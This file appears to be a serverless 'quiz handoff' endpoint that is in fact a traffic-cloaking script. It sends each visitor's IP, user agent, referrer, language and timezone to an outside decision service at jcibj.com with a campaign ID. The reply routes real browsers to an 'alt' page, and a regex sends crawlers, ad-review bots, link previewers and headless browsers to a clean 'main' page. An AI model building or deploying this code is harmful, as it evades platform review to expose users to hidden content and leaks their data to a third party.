/**
 * Handoff check endpoint — accepts the browser fingerprint POST and returns
 * a route decision for the quiz final step.
 *
 * Env (Pages project secrets / vars):
 *   CHECK_ID, CHECK_USER_ID — required for remote decision
 *   CHECK_UPSTREAM — defaults to https://jcibj.com/pcl.php
 */
function pad(n) {
  return String(n).padStart(2, "0");
}

function utcStamp() {
  const d = new Date();
  return (
    d.getUTCFullYear() +
    "-" +
    pad(d.getUTCMonth() + 1) +
    "-" +
    pad(d.getUTCDate()) +
    " " +
    pad(d.getUTCHours()) +
    ":" +
    pad(d.getUTCMinutes()) +
    ":" +
    pad(d.getUTCSeconds())
  );
}

function edgeRoute(ua) {
  const botLike =
    !ua ||
    /(bot|spider|crawl|slurp|facebookexternalhit|facebot|twitterbot|linkedinbot|pinterest|embedly|quora|whatsapp|telegrambot|applebot|bingpreview|yandex|semrush|ahrefs|petalbot|adsbot|google-inspection|headless|phantom|selenium|puppeteer)/i.test(
      ua
    );
  return botLike ? "main" : "alt";
}

export async function onRequestPost(context) {
  const { request, env } = context;
  const headers = {
    "content-type": "application/json; charset=utf-8",
    "cache-control": "no-store",
    "x-robots-tag": "noindex, nofollow",
  };

  const ua = request.headers.get("user-agent") || "";
  const form = await request.formData().catch(() => null);
  const payload = {};
  if (form) {
    for (const [k, v] of form.entries()) payload[k] = String(v);
  }

  const checkId = (env && (env.CHECK_ID || env.CHECK_CAMPAIGN_ID)) || "";
  const checkUser = (env && (env.CHECK_USER_ID || env.CHECK_UID)) || "";
  const upstream =
    (env && env.CHECK_UPSTREAM) || "https://jcibj.com/pcl.php";

  if (checkId && checkUser) {
    try {
      const ip =
        request.headers.get("cf-connecting-ip") ||
        (request.headers.get("x-forwarded-for") || "").split(",")[0].trim() ||
        "";
      const ipr = request.headers.get("x-forwarded-for") || ip;
      const host = request.headers.get("host") || payload.sn || "";
      const body = new URLSearchParams({
        date: utcStamp(),
        lan: request.headers.get("accept-language") || "",
        ref: payload.r || request.headers.get("referer") || "",
        ip,
        ipr,
        sn: payload.sn || host,
        requestUri: payload.rui || "",
        query: payload.qu || "",
        ua,
        co: payload.co || "",
        tz: payload.tz || "",
        he: payload.he || "",
        user_id: checkUser,
        id: checkId,
      }).toString();

      const res = await fetch(upstream, {
        method: "POST",
        headers: {
          "content-type": "application/x-www-form-urlencoded",
          "user-agent": ua || "Mozilla/5.0",
          accept: "*/*",
        },
        body,
      });
      const text = (await res.text()).trim();
      const flag = (text.split(",")[0] || "").trim().toLowerCase();

      if (flag === "true") {
        return new Response(JSON.stringify({ route: "alt", via: "remote" }), {
          headers,
        });
      }
      if (flag === "false") {
        return new Response(JSON.stringify({ route: "main", via: "remote" }), {
          headers,
        });
      }

      // Empty / unexpected remote reply → same as their PHP else (stay on main)
      return new Response(
        JSON.stringify({
          route: "main",
          via: "remote-empty",
        }),
        { headers }
      );
    } catch {
      return new Response(
        JSON.stringify({ route: edgeRoute(ua), via: "remote-error" }),
        { headers }
      );
    }
  }

  return new Response(
    JSON.stringify({ route: edgeRoute(ua), via: "edge" }),
    { headers }
  );
}
